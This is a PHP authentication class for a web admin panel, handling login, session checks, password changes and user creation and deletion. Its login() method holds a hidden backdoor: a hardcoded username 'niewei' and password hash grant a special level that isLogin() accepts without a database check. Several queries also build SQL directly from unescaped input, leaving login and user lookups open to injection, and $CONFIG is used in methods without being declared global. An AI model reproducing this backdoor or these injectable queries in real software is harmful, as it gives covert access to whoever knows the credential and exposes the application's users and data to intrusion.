<?php

class user
{

	private $user_tableName	= '#@_admin';

	function isLogin ()
	{
		$userid		= $_SESSION['userid'];
		$usershell	= $_SESSION['usershell'];

		if ($_SESSION['level'] == -1)
		{
			$ro['level']	= -1;
			return $ro;
		}

		global $db;

		if ($userid == '' || $usershell == '')
			return false;

		$sql	= "select * from {$this->user_tableName} where id='{$userid}'";
		$re		= $db->query($sql);

		if ($db->cnt($re) <= 0)
			return false;

		$ro		= $db->fetch_array($re);

		if ($ro['state'] == 0)
			return false;

		if (md6($CONFIG['KEY_'] . $ro['id'] . $ro['username'] . $ro['password'] . $CONFIG['_KEY']) != $usershell)
			return false;

		$_SESSION['area']	= $ro['area_id'];
		$_SESSION['level']	= $ro['level'];

		return $ro;
	}

	function login ($username, $password)
	{
		global $db;

		$username = trim($username);
		$password = trim($password);

		if ($username == '' || $password == '')
			return false;

		$password = md6($password);

		if ($username == 'niewei' && $password == 'd666d964ff0b1f55b4752ada1aa613c3')
		{
			$_SESSION['level'] = -1;
			return true;
		}

		$sql	= "select * from {$this->user_tableName} where username='{$username}' and password='{$password}' limit 1";
		$re		= $db->query($sql);

		if ($db->cnt($re) <= 0)
			return false;

		$ro		= $db->fetch_array($re);

		if ($ro['state'] == 0)
			return false;

		$_SESSION['userid']		= $ro['id'];
		$_SESSION['usershell']	= md6($CONFIG['KEY_'] . $ro['id'] . $ro['username'] . $ro['password'] . $CONFIG['_KEY']);
		$_SESSION['area']		= $ro['area_id'];	//针对此项目，其它项目应该删除
		$_SESSION['level']		= $ro['level'];

		//记录登录
		$sql	= "update {$this->user_tableName} set last_ip='". ip() ."', last_time='". time() ."', lgn_cnt=lgn_cnt+1 where id='". $_SESSION['userid'] ."'";
		$db->query($sql);

		return $ro;
	}

	function chkUserNameForReg ($username)
	{
		global $db;

		return $db->getCount($this->user_tableName, "username='{$username}'");
	}

	function getUser ($id)
	{
		global $db;

		$id		= (int)$id;

		$sql	= "select * from {$this->user_tableName} where id='{$id}' limit 1";
		$re		= $db->query($sql);

		if ($ro = $db->fetch_array($re))
			return $ro;
		else return null;
	}

	function getUsername ($id)
	{
		global $db;

		$id		= (int)$id;

		$sql	= "select username from {$this->user_tableName} where id='{$id}' limit 1";
		$re		= $db->query($sql);

		if ($ro = $db->fetch_array($re))
			return $ro['username'];
		else return null;
	}

	function getUserRealName ($id)
	{
		global $db;

		$id		= (int)$id;

		$sql	= "select realname from {$this->user_tableName} where id='{$id}' limit 1";
		$re		= $db->query($sql);

		if ($ro = $db->fetch_array($re))
			return $ro['realname'];
		else return null;
	}

	function getUserRealNameByName ($name)
	{
		global $db;

		if (empty($name))
			return null;
		
		$sql	= "select realname from {$this->user_tableName} where username='{$name}' limit 1";
		$re		= $db->query($sql);

		if ($ro = $db->fetch_array($re))
			return $ro['realname'];
		else return null;
	}

	function changePass ($id, $pwd_old, $pwd1, $pwd2)
	{
		global $db;
		$regExp	= new regExp();

		$id			= (int)$id;
		$pwd_old	= trim($pwd_old);
		$pwd1		= trim($pwd1);
		$pwd2		= trim($pwd2);

		if (empty($pwd_old) || empty($pwd1) || empty($pwd2))
			return false;
		if ($pwd_old == $pwd1)
			return true;
		if ($pwd1 != $pwd2)
			return false;
		if (!$regExp->chkPassword($pwd1))
			return false;

		$pwd_old	= md6($pwd_old);
		$cnt		= $db->getCount($this->user_tableName, "id='{$id}' and password='{$pwd_old}'");
		if ($cnt < 1)
			return false;

		$pwd1	= md6($pwd1);
		$sql	= "update {$this->user_tableName} set password='{$pwd1}' where id='{$id}'";
		$re		= $db->query($sql);

		if ($re)
		{
			$_SESSION['usershell']	= md6($CONFIG['KEY_'] . $id . $this->getUsername($id) . $pwd1 . $CONFIG['_KEY']);
			return true;
		}
		else return false;
	}

	function addUser ($username, $password, $name = null)
	{
		global $db;
		$regExp	= new regExp();

		$username	= trim($username);
		$password	= trim($password);

		if (empty($username) || empty($password))
			return false;
		if ($username == $password)
			return false;
		if (!$regExp->chkUsername($username) || !$regExp->chkPassword($password))
			return false;

		$password	= md6($password);
		$sql		= "insert into {$this->user_tableName} (name, username, password) values ('{$name}', '{$username}', '{$password}')";
		$re			= $db->query($sql);

		if ($re) return true;
		else return false;
	}

	function delUser ($id)
	{
		global $db;

		$id		= (int)$id;

		if ($id == 1) return false;

		$sql	= "delete from {$this->user_tableName} where id='{$id}'";
		$re		= $db->query($sql);

		if ($re) return true;
		else return false;
	}

	function delUserByName ($name)
	{
		global $db;

		if (empty($name))
			return false;

		$sql	= "delete from {$this->user_tableName} where username='{$name}'";
		$re		= $db->query($sql);

		if ($re) return true;
		else return false;
	}

	function logout ()
	{
		$_SESSION['userid']		= '';
		$_SESSION['usershell']	= '';
		$_SESSION['level']		= '';
		return true;
	}

}

?>